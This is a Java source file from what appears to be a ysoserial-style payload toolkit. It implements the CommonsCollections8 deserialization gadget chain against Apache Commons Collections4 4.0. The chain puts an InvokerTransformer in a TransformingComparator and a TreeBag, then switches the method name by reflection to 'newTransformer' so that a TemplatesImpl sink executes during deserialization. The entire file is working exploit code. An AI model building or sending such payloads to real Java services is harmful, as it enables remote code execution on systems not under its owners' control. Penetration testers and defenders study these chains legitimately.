package com.ppp.chain.collections4;

import com.ppp.ObjectPayload;
import com.ppp.annotation.Authors;
import com.ppp.annotation.Dependencies;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinkScheduler;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.Sink;
import com.ppp.utils.Reflections;
import org.apache.commons.collections.bag.TreeBag;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

/**
 * @author Whoopsunix
 */
@Dependencies({"org.apache.commons:commons-collections4:4.0"})
@Authors({Authors.NAVALORENZO})
@Sink({Sink.TemplatesImpl})
public class CommonsCollections8 implements ObjectPayload<Object> {

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(CommonsCollections8.class, args);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        // sink
        Object sinkObject = SinkScheduler.builder(sinksHelper);

        Object kickOffObject = getChain(sinkObject);

        return kickOffObject;
    }

    public Object getChain(Object templates) throws Exception {
        final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

        // define the comparator used for sorting
        TransformingComparator comp = new TransformingComparator(transformer);

        // prepare CommonsCollections object entry point
        TreeBag treeBag = new TreeBag(comp);
        treeBag.add(templates);

        // arm transformer
        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");

        return treeBag;
    }
}
